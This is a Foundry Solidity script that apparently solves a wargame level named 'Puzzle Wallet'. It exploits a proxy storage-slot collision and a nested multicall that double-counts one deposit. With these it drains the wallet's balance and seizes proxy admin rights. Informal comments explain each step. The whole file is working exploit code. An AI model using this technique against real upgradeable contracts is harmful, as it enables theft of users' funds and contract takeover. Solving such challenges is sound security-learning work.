pragma solidity ^0.8;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Console.sol";

interface IPuzzleProxy {
    // State variable getters
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);

    // Functions
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
}

interface IPuzzleWallet {
    // State variable getters
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address account) external view returns (bool);
    function balances(address account) external view returns (uint256);

    // Functions
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWallet is Script {
    function setUp() public {}

    function run() public {
        IPuzzleProxy proxy = IPuzzleProxy(0xbb2978Af239Ab7D6Df06708BaaA515E389E8002b);
        IPuzzleWallet wallet = IPuzzleWallet(address(proxy));
        address player = 0x3715592F5fDA21e57f13604551f928e3b9e5E3F5;
        // pendingAdmin and owner occupy slot 0
        // admin and maxBalance occupy slot 1
        // so we need to set pending take ownership then use that to set maxbalance to be uint256(address(player))
        vm.startBroadcast();
        proxy.proposeNewAdmin(player);
        // we are now owner of the wallet. We need to first whitelist ourselves then we can call setMaxBalance
        wallet.addToWhitelist(player);
        // so now we are past the modifier but we the require statement is rough, we need to somehow, get the balaance to zero.
        // im assuming its something with multicall but that shit is weird
        // prepare the multi call bin what we will do is have it deposit then call it self with another deposite as to bypass the flag. 
        bytes memory depositData = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory inner = new bytes[](1);
        inner[0] = depositData;
        bytes memory multicallData = abi.encodeWithSelector(wallet.multicall.selector, inner);
        bytes[] memory payload = new bytes[](2);
        payload[0] = depositData;
        payload[1] = multicallData;
        wallet.multicall{value: 0.001 ether}(payload);
        wallet.execute(player, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(player)));
        // now we are true admin.
        vm.stopBroadcast();
        require(proxy.admin() == player, "Not admin");
    }
}